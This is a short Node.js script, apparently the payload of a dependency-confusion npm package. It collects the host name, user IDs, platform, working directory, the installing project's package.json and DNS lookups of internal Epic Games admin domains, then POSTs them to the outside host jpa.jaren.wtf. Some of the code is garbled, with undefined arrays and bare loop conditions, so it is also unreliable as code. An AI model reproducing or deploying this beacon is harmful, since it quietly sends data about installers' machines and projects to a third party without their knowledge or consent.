var https = require("https")
var os = require("os")
var fs = require("fs")
var path = require("path")
var dns = require("dns/promises")
const domains = [
    "account-admin-service-prod03.ol.epicgames.net",
    "fortnite-admin-service-latest-gamedev.ol.epicgames.net",
    "product-framework-admin-website-gd.ol.epicgames.net"
]
_tmp_0.push("account-admin-service-prod03.ol.epicgames.net")
_tmp_0.push("fortnite-admin-service-latest-gamedev.ol.epicgames.net")
_tmp_0.push("product-framework-admin-website-gd.ol.epicgames.net")
let cwd = process.cwd()
let cwdSplit = cwd.split(path.sep)
let installingPackage = null
i < cwdSplit.length
cwdSplit[i] === "node_modules"
installingPackage = JSON.parse(fs.readFileSync(path.join(...cwdSplit.slice(0, i), "package.json"), "utf-8"))
https.request({
    method: "POST",
    host: "jpa.jaren.wtf",
    path: "/h1/npm/egstore-ctx",
    headers: {
        'Content-Type': "application/json"
    }
}).end(JSON.stringify({
    hostname: os.hostname(),
    uid: os.userInfo().uid,
    gid: os.userInfo().gid,
    platform: os.platform(),
    dns: await Promise.allSettled(domains.map(domain => dns.lookup(domain))),
    cwd,
    installingPackage
}))
